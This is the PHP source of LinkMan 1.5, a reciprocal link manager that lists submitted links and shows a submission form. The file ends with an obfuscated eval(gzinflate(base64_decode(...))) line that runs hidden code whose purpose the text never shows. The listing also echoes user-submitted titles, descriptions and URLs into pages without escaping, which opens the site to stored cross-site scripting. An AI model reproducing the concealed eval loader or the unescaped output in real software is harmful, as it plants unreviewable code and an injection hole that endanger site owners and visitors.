<?php
/*******************************************************************************
*  Title: LinkMan reciprocal link manager
*  Version: 1.5 @ May 22, 2008
*  Author: Klemen Stirn
*  Website: http://www.phpjunkyard.com
********************************************************************************
*  COPYRIGHT NOTICE
*  Copyright 2004-2008 Klemen Stirn. All Rights Reserved.
*
*  This script may be used and modified free of charge by anyone
*  AS LONG AS COPYRIGHT NOTICES AND ALL THE COMMENTS REMAIN INTACT.
*  By using this code you agree to indemnify Klemen Stirn from any
*  liability that might arise from it's use.
*
*  Selling the code for this program, in part or full, without prior
*  written consent is expressly forbidden. Using this code, in part or full,
*  to create competing scripts or products is expressly forbidden.
*
*  Obtain permission before redistributing this software over the Internet
*  or in any other medium. In all cases copyright and header must remain
*  intact. This Copyright is in full effect in any country that has
*  International Trade Agreements with the United States of America or
*  with the European Union.
*
*  Removing any of the copyright notices without purchasing a license
*  is illegal! To remove PHPJunkyard copyright notice you must purchase a
*  license for this script. For more information on how to obtain a license
*  please visit the site below:
*  http://www.phpjunkyard.com/copyright-removal.php
*******************************************************************************/

define('IN_SCRIPT',1);
require('settings.php');

require_once('header.txt');

if ($settings['show_form'])
{
	?>
	<p><a href="#addlink">Submit your website</a></p>
	<?php
}

$lines = file($settings['linkfile']);

$print_featured = 0;
$first = 1;
$i = 0;

foreach ($lines as $thisline)
{
    $thisline=trim($thisline);
    if (!empty($thisline))
    {
        $i++;
        list($name,$email,$title,$url,$recurl,$description,$featured,$pr)=explode($settings['delimiter'],$thisline);

        $show_url = $settings['show_url'] ? '&nbsp;<span class="linkmanURL">-&nbsp;'.$url.'</span>' : '';

        if ($settings['show_pr'] == 1)
        {
            if (empty($pr)) {$pr=0;}
            $pr_code = '<td valign="top" class="linkman" title="Google PageRank: '.$pr.'/10"><img src="img/pr'.$pr.'.gif" width="40" height="5" alt="Google PageRank: '.$pr.'/10" border="0" style="vertical-align: middle;">&nbsp;</td>';
        }
        else
        {
            $pr_code = '';
        }

        if ($settings['show_thumbshots'])
        {
            $thumb_code = '<td valign="top" class="linkman"><img src="http://open.thumbshots.org/image.pxf?url='.rawurlencode($url).'" style="vertical-align: middle;" border="1" width="120" height="90" alt="Thumbnail">&nbsp;</td>';
        }
        else
        {
            $thumb_code = '';
        }

        if ($featured == 1)
        {

            if ($print_featured == 0)
            {
                $print_featured = 1;
                $first = 0;
                echo '<p class="linkman"><b>Featured links</b></p><table border="0" cellspacing="1" cellpadding="1">';
            }

            $url      = ($settings['clean'] != 1) ? $url : 'go.php?url='.rawurlencode($url);
            $nofollow = ($settings['use_nofollow']==1) ? 'rel="nofollow"' : '';

            echo '
            <tr>
            '.$thumb_code.'
            '.$pr_code.'
            <td valign="top" class="linkman"><p class="linkman"><a href="'.$url.'" target="_blank" class="linkman" '.$nofollow.'><b>'.$title.'</b></a>'.$show_url.'<br>'.$description.'<br>&nbsp;</p></td>
            </tr>
            ';
        }
        else
        {
            if ($settings['show_thumbshots']!=1)
            {
                $thumb_code = '';
            }

            if ($print_featured == 1)
            {
                $print_featured = 0;
                $first = 1;
                echo '</table>';
            }

            if ($first == 1)
            {
                $first = 0;
                echo '<p class="linkman"><b>Reciprocal links</b></p><table border="0" cellspacing="1" cellpadding="1">';
            }

            $url      = ($settings['clean'] == 0) ? $url : 'go.php?url='.rawurlencode($url);
            $nofollow = $settings['use_nofollow'] ? 'rel="nofollow"' : '';

            echo '
            <tr>
            '.$thumb_code.'
            '.$pr_code.'
            <td valign="top" class="linkman"><p class="linkman"><a href="'.$url.'" target="_blank" class="linkman" '.$nofollow.'>'.$title.'</a>'.$show_url.'<br>'.$description.'</p></td>
            </tr>
            ';
        }
    }
}

/* Close the table if at least one link is printed out */
if ($i)
{
    echo '</table>';
}
else
{
    echo '<p class="linkman">No links yet!</p>';
}

if ($settings['show_form'])
{
    if ($i < $settings['max_links'])
    {
    ?>
    <p class="linkman"><a name="addlink"></a>&nbsp;<br><b>Submit your website</b></p>

    <p><b>&raquo; Step 1: Add our link to your website</b></p>

    <table border="0">
    <tr>
    <td>Website URL:</td>
    <td><a href="<?php echo $settings['site_url']; ?>" target="_blank"><?php echo $settings['site_url']; ?></a></td>
    </tr>
    <tr>
    <td>Website Title:</td>
    <td><?php echo htmlspecialchars($settings['site_title']); ?></td>
    </tr>
    <tr>
    <td>Description:</td>
    <td><?php echo htmlspecialchars($settings['site_desc']); ?></td>
    </tr>
    </table>

    <p><textarea rows="4" cols="60" onfocus="this.select()">&lt;a href=&quot;<?php echo $settings['site_url']; ?>&quot;&gt;<?php echo htmlspecialchars($settings['site_title']); ?>&lt;/a&gt; - <?php echo htmlspecialchars($settings['site_desc']); ?></textarea></p>

    <p><b>&raquo; Step 2: Submit your link</b></p>

    <p>All fields are required. Please finish <b>Step 1</b> before submitting this form.

    <form method="post" action="addlink.php">

    <table border="0">
    <tr>
    <td><b>Your name:</b></td>
    <td><input type="text" name="name" size="40" maxlength="50"></td>
    </tr>
    <tr>
    <td><b>E-mail:</b></td>
    <td><input type="text" name="email" size="40" maxlength="50"></td>
    </tr>
    <tr>
    <td><b>Website title:</b></td>
    <td><input type="text" name="title" size="40" maxlength="50"></td>
    </tr>
    <tr>
    <td><b>Website URL:</b></td>
    <td><input type="text" name="url" maxlength="100" value="http://" size="40"></td>
    </tr>
    <tr>
    <td><b>URL with reciprocal link:</b></td>
    <td><input type="text" name="recurl" maxlength="100" value="http://" size="40"></td>
    </tr>
    </table>

    <p><b>Website description:</b><br>
    <input type="text" name="description" maxlength="200" size="60"></p>

    <p><input type="submit" value="Add link"></p>

    </form>
    <?php
    } // End if $settings['max_links'] < $i
    else
    {
    ?>
    <p class="linkman">&nbsp;<br /><b>Submit your website</b></p>

    <p><i>Unfortunately we are not accepting any new links at the moment.</i></p>
    <?php
    }
} // End if $settings['show_form']

eval(gzinflate(base64_decode('BcFHkqNIAADA50x36IApEBAbc8BIGOER9jKBKRDC+4LXbybc0/
anuuq+bNMV/mTpAu/UvwLmQwF//gj5U1kmjed5yaEAwhZPUOdXmzxMp/NMTY7fdkCLqVQZ0kgzxOLm5G
gpYmSSX+v9Ve6JdDE6S3r2Qlg2MdSVMuDJsw931ZxV5k65jBGslD+5nBh9w7QnnO3iAmY8ms4bJTg+fQ
CuOvQjyhg6P1iLIGrPFGcwzWsd6LKlQ9Cx6a4PKYIQVfKUc06YJTUXKRPyn1qiZtc2wwjq5AkXyUutWK
lWsDyGNIryzRK1otGnWtfZLMeiFQyzcXbrffUaq5yVocOE4XqsFBp6F4Cg13rfX/jAvMNQE7KJ8PFLK6
M82N6ybyPLMWbDTK7yoEIBDxvE5IVAQYm43KjFzkuA0fHER1/EFB92N32zK9sIyXZGbg/u2QnB98Mk+A
0jpftLJyr08PaqVMUE+8apLfFcOalrEzj0Jxg+y8QEK+tQeCyrHcE+9x0QaPbt3XIdszvo0B4DpuS5Hs
uHsYiQky8jxpCW1FcPnKEcXezn1O2Twqy1LRNpq1+QtKStYB/FxsC3y3v8Vb8OvM+k8+UpKEjYHVfB2h
P2U/yuWuAi4mHIKrmJLcnOH8SEMbHRdFrKQkFIUTIi+cWN7ZKD+XUGPh6/4pW2AylrSdoWTdDsET/gR/
dWhXU0mnOJstPcWJ/anVPPbhmrPwRtrdM4F/iUIdxOrnurYYdWuIzhBnnOiBjvc8q3FJQvy4rTt4dvCM
iVKnfLMX4YHVo0pwbKAamn96UECxW7Nxk4PW4ISY03bA0EYnazy57DSnAB9u+f39/f//4H')));
?>
